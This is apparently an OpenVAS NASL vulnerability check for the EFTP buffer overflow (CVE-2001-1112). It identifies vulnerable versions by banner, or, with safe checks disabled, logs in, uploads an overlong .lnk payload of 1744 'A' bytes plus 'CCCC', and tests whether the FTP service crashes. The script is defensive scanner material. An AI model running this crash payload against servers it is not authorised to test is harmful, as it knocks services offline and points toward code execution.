# OpenVAS Vulnerability Test
# $Id: eftp_bufferoverflow.nasl 8023 2017-12-07 08:36:26Z teissa $
# Description: EFTP buffer overflow
#
# Authors:
# Michel Arboi <arboi@noos.fr>
#
# Copyright:
# Copyright (C) 2001 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "It was possible to crash the EFTP service by
uploading a *.lnk file containing too much data.

A cracker may use this attack to make this
service crash continuously, or run arbitrary code
on your system.";

tag_solution = "upgrade EFTP to 2.0.8.x";

if(description)
{
 script_id(10928);
 script_version("$Revision: 8023 $");
 script_tag(name:"last_modification", value:"$Date: 2017-12-07 09:36:26 +0100 (Thu, 07 Dec 2017) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(3330);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_cve_id("CVE-2001-1112");
 name = "EFTP buffer overflow";
 script_name(name);
 
 
 script_category(ACT_MIXED_ATTACK);
  script_tag(name:"qod_type", value:"remote_banner");
 
 script_copyright("This script is Copyright (C) 2001 Michel Arboi");
 family = "Gain a shell remotely";

 script_family(family);
 script_require_ports("Services/ftp", 21);
 script_dependencies("find_service.nasl", "secpod_ftp_anonymous.nasl");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

#

include("ftp_func.inc");

port = get_kb_item("Services/ftp");
if (!port) port = 21; 

state = get_port_state(port);
if (!state) exit(0);

user_login = get_kb_item("ftp/login");
user_passwd = get_kb_item("ftp/password");
writeable_dir = get_kb_item("ftp/writeable_dir");
use_banner = 1;

if (user_login && user_passwd && writeable_dir)
{
 use_banner = safe_checks();
}

if (use_banner)
{
 banner = get_ftp_banner(port: port);
 if(egrep(pattern:".*EFTP Version 2\.0\.[0-7]\.*", string:banner))
 {
  desc = "
It may be possible to crash the EFTP service by
uploading a *.lnk file containing too much data.

A cracker may use this attack to make this
service crash continuously, or run arbitrary code
on your system.

*** OpenVAS reports this vulnerability using only
*** information that was gathered. Use caution
*** when testing without safe checks enabled.

Solution: upgrade EFTP to 2.0.8.x";
  security_message(port:port, data:desc);
 } 
 exit(0);
}

soc = open_sock_tcp(port);
if (!soc) exit(0);




r = ftp_authenticate(socket:soc, user:user_login, pass:user_passwd);
if (!r) 
{
 ftp_close(socket: soc);
 exit(0);
}

# Go to writable dir
cmd = string("CWD ", writeable_dir, "\r\n");
send(socket:soc, data:cmd);
a = recv_line(socket:soc, length:1024);

f_name =  string("OpenVAS", rand()%10, rand()%10, rand()%10, rand()%10, ".lnk");

# Upload a buggy .LNK
port2 = ftp_pasv(socket:soc);
soc2 = open_sock_tcp(port2, transport:get_port_transport(port));
cmd = string("STOR ", f_name, "\r\n");
send(socket:soc, data:cmd);
r = recv_line(socket:soc, length:1024);	# Read the 3 digits ?
if(ereg(pattern:"^5[0-9][0-9] .*", string:r))
 {
  exit(0);
 }


d = string(crap(length:1744, data: "A"), "CCCC");
send(socket:soc2, data:d);
close(soc2);

# Now run DIR
cmd = string("LIST\r\n");
send(socket:soc, data:cmd);
r = recv_line(socket: soc, length: 1024);
ftp_close(socket: soc);

# Now check if it is still alive
soc = open_sock_tcp(port);
if (! soc)
{
 security_message(port);
}

# Or clean mess :)

if (soc)
{ 
 ftp_authenticate(socket:soc, user:user_login, pass:user_passwd);
 cmd = string("CWD ", writeable_dir, "\r\n");
 send(socket:soc, data:cmd);
 r = recv_line(socket:soc, length:1024);
 cmd = string ("DELE ", f_name, "\r\n");
 send(socket:soc, data:cmd);
 r = recv_line(socket:soc, length:1024);
 ftp_close(socket: soc);
}
